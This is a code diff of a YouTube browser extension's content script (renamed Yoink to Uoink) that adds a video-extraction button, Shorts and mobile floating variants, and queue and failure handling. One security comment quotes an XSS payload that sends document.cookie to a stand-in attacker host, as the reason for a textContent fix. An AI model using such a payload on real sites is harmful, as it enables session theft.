@@ -1,5 +1,5 @@
-// Yoink — content script.
-// Injects a Yoink button under the YouTube player (alongside Like / Share /
+// Uoink — content script.
+// Injects an Uoink button under the YouTube player (alongside Like / Share /
 // Download) that POSTs the current video URL to the local helper server,
 // copies the returned markdown to the clipboard, and opens claude.ai in a
 // new tab.
@@ -10,7 +10,7 @@
 (() => {
   "use strict";
 
-  const BTN_CLASS = "stc-yt-injected-button";
+  const BTN_CLASS = "uoink-btn";
   const BTN_ID = "stc-yt-send-to-claude";
   const ANCHOR_SELECTORS = [
     "ytd-watch-metadata #top-level-buttons-computed",
@@ -20,6 +20,17 @@
     "#actions-inner",
     "#actions",
   ];
+  // Class marking the button as the free-floating Shorts variant. On
+  // /shorts/<id> pages YouTube's like/dislike/share column has no stable
+  // insertion slot: its DOM is rebuilt per-reel as the user scrolls, and the
+  // markup has churned across YouTube revisions (Sprint 10's `#actions`-based
+  // anchor never rendered in Ryan's smoke test). So Shorts gets a
+  // fixed-position button parented to <body> — it survives Shorts-to-Shorts
+  // transitions and needs no anchor element at all.
+  const SHORTS_FLOATING_CLASS = "stc-yt-shorts-floating";
+  const LAST_YOINK_CLIPBOARD_KEY = "yoink_last_clipboard_at";
+  const LAST_CLIPBOARD_BUDGET_KEY = "yoink_last_clipboard_budget";
+  const RECENT_FAILURES_KEY = "yoink_recent_failures";
 
   // ---- Styles (scoped via the unique class prefix) ----------------------
   const STYLE_ID = "stc-yt-styles";
@@ -38,21 +49,52 @@
         margin-left: 8px;
         border: none;
         border-radius: 18px;
-        background: var(--yt-spec-badge-chip-background, rgba(255,255,255,0.1));
-        color: var(--yt-spec-text-primary, #fff);
+        background: #C2410C;
+        color: #FFF4EC;
         font-family: "Roboto", "Arial", sans-serif;
         font-size: 14px;
-        font-weight: 500;
+        font-weight: 600;
         line-height: 36px;
         cursor: pointer;
         white-space: nowrap;
-        transition: background-color 0.12s ease, box-shadow 0.18s ease;
+        transition: background-color 0.15s ease, color 0.15s ease, transform 0.12s ease;
       }
-      .${BTN_CLASS}:hover { background: rgba(255,255,255,0.2); }
-      .${BTN_CLASS}:active { background: rgba(255,255,255,0.28); }
+      .${BTN_CLASS}:focus-visible {
+        outline: 1px solid #FFF4EC;
+        outline-offset: 1px;
+      }
+      /* Shorts variant — a fixed-position pill in the lower-right, sitting
+         below the like/dislike/share column. Parented to <body> so YouTube
+         rebuilding the reel DOM on Shorts-to-Shorts scroll cannot remove it.
+         Declared before the error/success rules below so those still win
+         the background color when the button flips state. */
+      .${BTN_CLASS}.${SHORTS_FLOATING_CLASS} {
+        position: fixed;
+        right: 24px;
+        bottom: 84px;
+        margin: 0;
+        z-index: 2000;
+        height: 40px;
+        border-radius: 20px;
+        background: #15110D;
+        color: #FFF4EC;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        border: 1px solid #2C2621;
+      }
+      .${BTN_CLASS}.${SHORTS_FLOATING_CLASS}:hover {
+        background: #C2410C;
+        box-shadow: 0 2px 14px rgba(0,0,0,0.6);
+      }
+      .${BTN_CLASS}:hover {
+        background: #FF3D00;
+        color: #0A0A0A;
+      }
+      .${BTN_CLASS}:active {
+        transform: translateY(1px) scale(0.97);
+      }
       .${BTN_CLASS}[disabled] { opacity: 0.7; cursor: progress; }
-      .${BTN_CLASS}.stc-yt-error { background: rgba(217,87,87,0.25); color: #ffd9d9; }
-      .${BTN_CLASS}.stc-yt-success { background: rgba(87,217,131,0.25); color: #d9ffe7; }
+      .${BTN_CLASS}.stc-yt-error { background: #3A1F1F; color: #FFD9D9; }
+      .${BTN_CLASS}.stc-yt-success { background: #1F2B22; color: #D9FFE7; }
 
       /* Live server status — an 8px dot to the left of the label. */
       .${BTN_CLASS} .${DOT_CLASS} {
@@ -63,23 +105,19 @@
         background: #888;
         transition: background-color 0.18s ease, box-shadow 0.18s ease;
       }
-      .${BTN_CLASS}.yoink-status-online { /* base style; dot turns green */ }
-      .${BTN_CLASS}.yoink-status-online:hover {
-        box-shadow: 0 0 0 2px rgba(234, 88, 12, 0.35);
+      .${BTN_CLASS}.uoink-status-online .${DOT_CLASS} {
+        background: #00C853;
+        box-shadow: 0 0 6px rgba(0,200,83,0.55);
       }
-      .${BTN_CLASS}.yoink-status-online .${DOT_CLASS} {
-        background: #57d983;
-        box-shadow: 0 0 6px rgba(87,217,131,0.55);
+      .${BTN_CLASS}.uoink-status-offline .${DOT_CLASS} {
+        background: #B8421A;
+        box-shadow: 0 0 6px rgba(184,66,26,0.55);
       }
-      .${BTN_CLASS}.yoink-status-offline .${DOT_CLASS} {
-        background: #f59e0b;
-        box-shadow: 0 0 6px rgba(245,158,11,0.55);
-      }
-      .${BTN_CLASS}.yoink-status-checking .${DOT_CLASS} {
+      .${BTN_CLASS}.uoink-status-checking .${DOT_CLASS} {
         background: #888;
         animation: stc-yt-pulse 1.4s ease-in-out infinite;
       }
-      .${BTN_CLASS}.yoink-status-checking { cursor: progress; }
+      .${BTN_CLASS}.uoink-status-checking { cursor: progress; }
       /* One-shot transition flash when state actually changes. */
       .${BTN_CLASS} .${DOT_CLASS}.stc-yt-flash {
         animation: stc-yt-dot-flash 0.55s ease-out;
@@ -94,7 +132,12 @@
         100% { transform: scale(1); }
       }
 
-      .${BTN_CLASS} .stc-yt-icon { width: 16px; height: 16px; flex-shrink: 0; }
+      .${BTN_CLASS} .stc-yt-icon {
+        width: 11px;
+        height: 14px;
+        flex-shrink: 0;
+        margin-right: 2px;
+      }
       .${BTN_CLASS} .stc-yt-spinner {
         width: 14px; height: 14px;
         border: 2px solid rgba(255,255,255,0.3);
@@ -108,9 +151,10 @@
   }
 
   const ICON_SVG = `
-    <svg class="stc-yt-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-      <path d="M12 2 L14.2 9.8 L22 12 L14.2 14.2 L12 22 L9.8 14.2 L2 12 L9.8 9.8 Z"
-            fill="currentColor"/>
+    <svg class="stc-yt-icon" viewBox="0 0 100 100" width="11" height="14" aria-hidden="true" style="display: block;">
+      <path d="M 0 0 L 32 0 L 32 60 L 68 60 L 68 0 L 100 0 L 100 80 Q 100 100 80 100 L 20 100 Q 0 100 0 80 Z" fill="currentColor"/>
+      <rect x="0" y="0" width="32" height="20" fill="#FFF4EC"/>
+      <rect x="68" y="0" width="32" height="20" fill="#FFF4EC"/>
     </svg>
   `;
   const DOT_SVG = `<span class="${DOT_CLASS}" aria-hidden="true"></span>`;
@@ -119,14 +163,31 @@
     btn.classList.remove("stc-yt-error", "stc-yt-success");
     if (state === "error") btn.classList.add("stc-yt-error");
     if (state === "success") btn.classList.add("stc-yt-success");
+    // Build button contents without ever putting `label` into innerHTML.
+    // `label` flows from activeSession.name (chrome.storage, user-controlled
+    // via the popup's session-name input) into this function. Interpolating
+    // it into innerHTML would let a session named e.g.
+    //   <img src=x onerror="fetch('//attacker/'+document.cookie)">
+    // execute script in the YouTube page origin. Build the static chrome
+    // via innerHTML on a throwaway container (constants only), then append
+    // the label as a textContent span.
+    btn.replaceChildren();
+    const chromeWrap = document.createElement("span");
+    chromeWrap.style.display = "inline-flex";
+    chromeWrap.style.alignItems = "center";
+    chromeWrap.style.gap = "6px";
     if (state === "working") {
       btn.disabled = true;
-      btn.innerHTML = `<span class="stc-yt-spinner"></span><span>${label}</span>`;
+      chromeWrap.innerHTML = `<span class="stc-yt-spinner"></span>`;
     } else {
       // Only re-enable when not in the "checking" status (which gates clicks).
       btn.disabled = serverStatus === "checking";
-      btn.innerHTML = `${DOT_SVG}${ICON_SVG}<span>${label}</span>`;
+      chromeWrap.innerHTML = `${DOT_SVG}${ICON_SVG}`;
     }
+    while (chromeWrap.firstChild) btn.appendChild(chromeWrap.firstChild);
+    const labelEl = document.createElement("span");
+    labelEl.textContent = label;
+    btn.appendChild(labelEl);
   }
 
   function resetButtonAfter(btn, ms) {
@@ -137,7 +198,7 @@
     try {
       chrome.runtime.sendMessage({ type: "notify", title, message });
     } catch (e) {
-      console.warn("[Yoink] notify failed", e);
+      console.warn("[Uoink] notify failed", e);
     }
   }
 
@@ -145,11 +206,11 @@
     try {
       chrome.runtime.sendMessage({ type: "openTab", url });
     } catch (e) {
-      console.warn("[Yoink] openTab failed", e);
+      console.warn("[Uoink] openTab failed", e);
     }
   }
 
-  // Throttled — prevents tab spam if the user mashes Yoink while the server
+  // Throttled — prevents tab spam if the user mashes Uoink while the server
   // is still offline. 5s window resets per page load.
   let _lastSetupOpen = 0;
   function openSetupOffline() {
@@ -159,13 +220,13 @@
     try {
       openTab(chrome.runtime.getURL("setup.html?source=offline"));
     } catch (e) {
-      console.warn("[Yoink] openSetupOffline failed", e);
+      console.warn("[Uoink] openSetupOffline failed", e);
     }
   }
 
   // ---- Live server status ------------------------------------------------
   // Visible signal next to the button label so the user knows whether a
-  // click will yoink (online) or pop the setup guide (offline).
+  // click will uoink (online) or pop the setup guide (offline).
   const STATUS_POLL_MS = 10_000;
   let serverStatus = "checking"; // "checking" | "online" | "offline"
   let statusTimer = null;
@@ -173,19 +234,19 @@
 
   function applyStatusToButton(btn) {
     if (!btn) return;
-    // Mid-yoink — don't clobber the working state. Status applies when the
-    // post-yoink reset puts the button back into default mode.
+    // Mid-uoink — don't clobber the working state. Status applies when the
+    // post-uoink reset puts the button back into default mode.
     if (btn.querySelector(".stc-yt-spinner")) return;
-    btn.classList.remove("yoink-status-online", "yoink-status-offline", "yoink-status-checking");
-    btn.classList.add(`yoink-status-${serverStatus}`);
+    btn.classList.remove("uoink-status-online", "uoink-status-offline", "uoink-status-checking");
+    btn.classList.add(`uoink-status-${serverStatus}`);
     if (serverStatus === "online") {
       btn.title = "Extract transcript + screenshots and open Claude";
       btn.disabled = false;
     } else if (serverStatus === "offline") {
-      btn.title = "Yoink server offline — click to start";
+      btn.title = "Uoink Helper offline — click to start";
       btn.disabled = false;
     } else {
-      btn.title = "Checking Yoink status...";
+      btn.title = "Checking Uoink Helper status...";
       btn.disabled = true;
     }
   }
@@ -272,7 +333,7 @@
   }
 
   function defaultLabel() {
-    return activeSession ? `Add to session: ${activeSession.name || activeSession.id}` : "Yoink";
+    return activeSession ? `Add to session: ${activeSession.name || activeSession.id}` : "Uoink";
   }
 
   function refreshDefaultLabel() {
@@ -289,21 +350,102 @@
   });
 
   // ---- Click handler ----------------------------------------------------
-  async function onClick(btn) {
-    const rawUrl = window.location.href;
-    if (!/youtube\.com\/watch/.test(rawUrl)) return;
+  function normalizedCurrentVideoUrl() {
+    return STC.normalizeYouTubeUrl(window.location.href);
+  }
 
-    // Gate by live server status: don't even attempt yoink while the helper
+  function isSupportedVideoPage() {
+    return !!normalizedCurrentVideoUrl();
+  }
+
+  function isShortsPage() {
+    try {
+      return new URL(window.location.href).pathname.startsWith("/shorts/");
+    } catch {
+      return false;
+    }
+  }
+
+  function isMobileYouTube() {
+    try {
+      return new URL(window.location.href).hostname === "m.youtube.com";
+    } catch {
+      return false;
+    }
+  }
+
+  function usesFloatingButton() {
+    return isShortsPage() || isMobileYouTube();
+  }
+
+  function pageVideoTitle() {
+    const meta = document.querySelector("meta[name='title']");
+    const raw = (meta && meta.content) || document.title || "";
+    return raw.replace(/\s+-\s+YouTube\s*$/i, "").trim();
+  }
+
+  function markClipboardUoinkNow() {
+    try {
+      chrome.storage.local.set({ [LAST_YOINK_CLIPBOARD_KEY]: Date.now() });
+    } catch { /* ignore */ }
+  }
+
+  function screenshotCountFromData(data, text) {
+    return globalThis.UoinkUI.screenshotCountFromData(data, text);
+  }
+
+  function rememberClipboardBudget(data, clipboardText) {
+    const budget = globalThis.UoinkUI.clipboardBudgetFromData(data, clipboardText);
+    try {
+      chrome.storage.local.set({ [LAST_CLIPBOARD_BUDGET_KEY]: budget });
+    } catch { /* ignore */ }
+  }
+
+  function minutesUntil(value) {
+    return globalThis.UoinkUI.minutesUntil(value);
+  }
+
+  function queuedMessage(data) {
+    return globalThis.UoinkUI.queuedMessage(data, {
+      suffix: "Open the Uoink popup for status.",
+    });
+  }
+
+  function rememberFailure(url, error) {
+    const videoId = STC.extractVideoId(url);
+    const entry = {
+      id: `${Date.now()}-${videoId || "video"}`,
+      url,
+      videoId,
+      title: pageVideoTitle(),
+      error,
+      failed_at: new Date().toISOString(),
+    };
+    try {
+      chrome.storage.local.get({ [RECENT_FAILURES_KEY]: [] }, (items) => {
+        const failures = Array.isArray(items && items[RECENT_FAILURES_KEY])
+          ? items[RECENT_FAILURES_KEY]
+          : [];
+        const next = [entry].concat(failures.filter((f) => f.url !== url)).slice(0, 5);
+        chrome.storage.local.set({ [RECENT_FAILURES_KEY]: next });
+      });
+    } catch { /* ignore */ }
+  }
+
+  async function onClick(btn) {
+    const url = normalizedCurrentVideoUrl();
+    if (!url) return;
+
+    // Gate by live server status: don't even attempt uoink while the helper
     // is down — pop the setup guide instead. The "checking" state is
     // disabled at the button level so this branch usually isn't reached.
     if (serverStatus === "checking") return;
     if (serverStatus === "offline") {
-      notify("Yoink isn't running yet", "Opening setup guide...");
+      notify("Uoink Helper offline", "Start Uoink from the Start Menu");
       openSetupOffline();
       return;
     }
 
-    const url = STC.normalizeYouTubeUrl(rawUrl) || rawUrl;
     activeSession = await getActiveFromStorage(); // freshen in case popup just changed it
     const interval = await STC.getInterval();
 
@@ -314,16 +456,16 @@
   }
 
   async function runExtract(btn, url, interval) {
-    setButtonState(btn, "working", "Yoinking...");
+    setButtonState(btn, "working", "Uoinking...");
 
     let data;
     try {
       data = await STC.postExtractViaBg(url, interval);
     } catch (e) {
-      console.error("[Yoink] server unreachable", e);
-      setButtonState(btn, "error", "Yoink server offline");
-      btn.title = "Open the Yoink setup guide to start the helper.";
-      notify("Yoink isn't running yet", "Opening setup guide...");
+      console.error("[Uoink] server unreachable", e);
+      setButtonState(btn, "error", "Uoink Helper offline");
+      btn.title = "Open the Uoink setup guide to start the helper.";
+      notify("Uoink Helper offline", "Start Uoink from the Start Menu");
       openSetupOffline();
       resetButtonAfter(btn, 5000);
       return;
@@ -331,9 +473,39 @@
 
     if (!data || !data.ok) {
       const msg = STC.friendlyError(data && data.error);
-      setButtonState(btn, "error", "Yoink failed");
+      if (/queue full/i.test(msg)) {
+        setButtonState(btn, "error", "Queue full");
+        btn.title = "Queue full, wait a few minutes.";
+        notify("Uoink queue full", "Queue full, wait a few minutes.");
+        resetButtonAfter(btn, 5000);
+        return;
+      }
+      rememberFailure(url, msg);
+      setButtonState(btn, "error", "Uoink failed");
       btn.title = msg;
-      notify("Yoink failed", msg);
+      notify("Uoink failed", msg);
+      resetButtonAfter(btn, 5000);
+      return;
+    }
+
+    if (data.queued) {
+      setButtonState(btn, "success", "Queued");
+      btn.title = queuedMessage(data);
+      notify("Uoink queued", queuedMessage(data));
+      resetButtonAfter(btn, 5000);
+      return;
+    }
+
+    // Sprint 3: Smart Screenshot Picker intercept. Default off keeps v1
+    // behavior byte-identical. When enabled, we hand the corpus off to the
+    // popup via chrome.storage.local instead of clipboard + Claude tab.
+    if (await _useScreenshotPicker()) {
+      rememberClipboardBudget(data, data.corpus_md_paste || data.yoink_md);
+      await STC.stashPickerCorpus(data);
+      notify("Uoink ready",
+             "Click the Uoink icon to pick which screenshots to include.");
+      setButtonState(btn, "success", "Pick screenshots →");
+      btn.title = `Saved to: ${data.folder}. Click the Uoink icon to finish.`;
       resetButtonAfter(btn, 5000);
       return;
     }
@@ -343,12 +515,13 @@
     // The file version (yoink_md) is the dev-mode fallback when Pillow
     // wasn't bundled or paste generation failed.
     const clipboardText = data.corpus_md_paste || data.yoink_md;
+    rememberClipboardBudget(data, clipboardText);
     let copied = false;
     try {
       await navigator.clipboard.writeText(clipboardText);
       copied = true;
     } catch (e) {
-      console.warn("[Yoink] clipboard API failed, falling back", e);
+      console.warn("[Uoink] clipboard API failed, falling back", e);
       try {
         const ta = document.createElement("textarea");
         ta.value = clipboardText;
@@ -359,21 +532,43 @@
         copied = document.execCommand("copy");
         document.body.removeChild(ta);
       } catch (e2) {
-        console.error("[Yoink] clipboard fallback failed", e2);
+        console.error("[Uoink] clipboard fallback failed", e2);
       }
     }
 
+    if (!copied) {
+      try {
+        chrome.runtime.sendMessage({ type: "clipboardRetry", text: clipboardText });
+      } catch { /* ignore */ }
+      setButtonState(btn, "error", "Copy blocked");
+      btn.title = "Couldn't copy to clipboard. Use the notification's Try again button.";
+      resetButtonAfter(btn, 5000);
+      return;
+    }
+
+    markClipboardUoinkNow();
     openTab("https://claude.ai/new");
 
-    // Same shared helper used by the SW queue path. First successful yoink
+    // Same shared helper used by the SW queue path. First successful uoink
     // (whether triggered here or through the right-click menu) gets the
-    // CTA copy; subsequent yoinks fall back to the topic-aware copy.
-    const message = await STC.buildYoinkedMessage(data, copied);
-    notify("Yoinked!", message);
+    // CTA copy; subsequent uoinks fall back to the topic-aware copy.
+    const message = await STC.buildUoinkedMessage(data, copied);
+    notify("Uoinked ★", message);
 
-    setButtonState(btn, "success", "Yoinked ✓");
+    setButtonState(btn, "success", "Uoinked ★");
     btn.title = `Saved to: ${data.folder}`;
     resetButtonAfter(btn, 3000);
+  }
+
+  async function _useScreenshotPicker() {
+    try {
+      const res = await STC.getSettings();
+      return !!(res && res.ok && res.settings &&
+                res.settings.smart_screenshot_picker_enabled === true);
+    } catch (e) {
+      console.warn("[Uoink] settings fetch failed, picker disabled", e);
+      return false;
+    }
   }
 
   async function runSessionAdd(btn, url, interval) {
@@ -384,10 +579,10 @@
     try {
       data = await STC.addToSessionViaBg(activeSession.id, url, interval);
     } catch (e) {
-      console.error("[Yoink] server unreachable", e);
-      setButtonState(btn, "error", "Yoink server offline");
-      btn.title = "Open the Yoink setup guide to start the helper.";
-      notify("Yoink isn't running yet", "Opening setup guide...");
+      console.error("[Uoink] server unreachable", e);
+      setButtonState(btn, "error", "Uoink Helper offline");
+      btn.title = "Open the Uoink setup guide to start the helper.";
+      notify("Uoink Helper offline", "Start Uoink from the Start Menu");
       openSetupOffline();
       resetButtonAfter(btn, 5000);
       return;
@@ -395,9 +590,10 @@
 
     if (!data || !data.ok) {
       const msg = STC.friendlyError(data && data.error);
-      setButtonState(btn, "error", "Yoink failed");
+      rememberFailure(url, msg);
+      setButtonState(btn, "error", "Uoink failed");
       btn.title = msg;
-      notify("Yoink failed", msg);
+      notify("Uoink failed", msg);
       resetButtonAfter(btn, 5000);
       return;
     }
@@ -412,6 +608,8 @@
   }
 
   // ---- Inject -----------------------------------------------------------
+  // Anchor lookup for /watch pages only. Shorts deliberately bypasses this —
+  // see SHORTS_FLOATING_CLASS for why no Shorts DOM anchor is trusted.
   function findAnchor() {
     for (const sel of ANCHOR_SELECTORS) {
       const el = document.querySelector(sel);
@@ -421,17 +619,47 @@
   }
 
   function injectButton() {
-    if (!/youtube\.com\/watch/.test(window.location.href)) return false;
-    if (document.getElementById(BTN_ID)) return true;
+    if (!isSupportedVideoPage()) {
+      // Navigated off every video/Shorts page — tear down a lingering
+      // floating Shorts button. The /watch button lives inside DOM that
+      // YouTube discards on navigation, so it needs no explicit cleanup.
+      const stale = document.getElementById(BTN_ID);
+      if (stale && stale.classList.contains(SHORTS_FLOATING_CLASS)) stale.remove();
+      return false;
+    }
 
-    const anchor = findAnchor();
-    if (!anchor) return false;
+    const floating = usesFloatingButton();
+    const existing = document.getElementById(BTN_ID);
+    if (existing) {
+      const isFloating = existing.classList.contains(SHORTS_FLOATING_CLASS);
+      if (isFloating === floating) {
+        // Button already matches the current page type. The floating Shorts
+        // or mobile button (parented to <body>) needs nothing further; the
+        // desktop /watch button is re-homed if YouTube re-rendered the row.
+        if (!floating) {
+          const watchAnchor = findAnchor();
+          if (watchAnchor && existing.parentElement !== watchAnchor) {
+            watchAnchor.appendChild(existing);
+          }
+        }
+        return true;
+      }
+      // Crossed between anchored desktop and floating mobile/Shorts layouts;
+      // discard and rebuild for the new page type.
+      existing.remove();
+    }
+
+    // Desktop /watch needs an anchor element to live in; Shorts and mobile
+    // YouTube float on <body> because their DOM uses different action rows.
+    const anchor = floating ? null : findAnchor();
+    if (!floating && !anchor) return false;
 
     injectStyles();
 
     const btn = document.createElement("button");
     btn.id = BTN_ID;
     btn.className = BTN_CLASS;
+    if (floating) btn.classList.add(SHORTS_FLOATING_CLASS);
     btn.type = "button";
     setButtonState(btn, "default", defaultLabel());
     applyStatusToButton(btn);
@@ -441,7 +669,7 @@
       onClick(btn);
     });
 
-    anchor.appendChild(btn);
+    (floating ? document.body : anchor).appendChild(btn);
     // Now that the button exists, fetch the latest active-session state and
     // re-label if needed.
     getActiveFromStorage().then((s) => {
@@ -449,30 +677,27 @@
       refreshDefaultLabel();
     });
     // If the setup page handed us a video to auto-yoink, consume the flag.
-    maybeAutoYoink(btn).catch((e) => console.warn("[Yoink] auto_yoink failed", e));
+    maybeAutoUoink(btn).catch((e) => console.warn("[Uoink] auto_yoink failed", e));
     return true;
   }
 
-  // ---- Auto-yoink handoff from setup.html -------------------------------
+  // ---- Auto-uoink handoff from setup.html -------------------------------
   // The setup page writes {auto_yoink: {videoId, ts}} to local storage and
   // opens the YouTube URL in a new tab. We trigger the button on the first
   // injection on the matching video, then atomically clear the flag so a
   // page refresh or a different tab doesn't re-fire it.
-  const AUTO_YOINK_TTL_MS = 60_000;
+  const AUTO_UOINK_TTL_MS = 60_000;
   function currentVideoId() {
-    try {
-      const u = new URL(window.location.href);
-      return u.searchParams.get("v");
-    } catch { return null; }
+    return STC.extractVideoId(window.location.href);
   }
-  async function maybeAutoYoink(btn) {
+  async function maybeAutoUoink(btn) {
     const stored = await new Promise((r) => {
       try {
         chrome.storage.local.get({ auto_yoink: null }, (i) => r(i.auto_yoink));
       } catch { r(null); }
     });
     if (!stored || !stored.videoId) return;
-    if (Date.now() - (stored.ts || 0) > AUTO_YOINK_TTL_MS) {
+    if (Date.now() - (stored.ts || 0) > AUTO_UOINK_TTL_MS) {
       try { chrome.storage.local.remove("auto_yoink"); } catch { /* ignore */ }
       return;
     }
@@ -507,9 +732,38 @@
   });
 
   const observer = new MutationObserver(() => {
-    if (!document.getElementById(BTN_ID)) injectButton();
+    const btn = document.getElementById(BTN_ID);
+    if (!btn) {
+      injectButton();
+      return;
+    }
+    // Survive /watch <-> /shorts transitions: if the button's variant no
+    // longer matches the current page type, rebuild it. Shorts-to-Shorts
+    // scrolls need no action here — the floating button is parented to
+    // <body>, which YouTube never tears down between reels.
+    if (btn.classList.contains(SHORTS_FLOATING_CLASS) !== isShortsPage()) {
+      injectButton();
+    }
   });
   observer.observe(document.body, { childList: true, subtree: true });
+
+  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
+    if (msg && msg.type === "uoinkShortcutTriggered") {
+      const btn = document.getElementById(BTN_ID);
+      if (btn) {
+        btn.click();
+        sendResponse({ success: true });
+      } else {
+        const url = normalizedCurrentVideoUrl();
+        if (url) {
+          onClick(document.createElement("button"));
+          sendResponse({ success: true });
+        } else {
+          sendResponse({ success: false });
+        }
+      }
+    }
+  });
 
   tryInjectWithRetries();
   // Kick off /health polling so the button has a real status before the
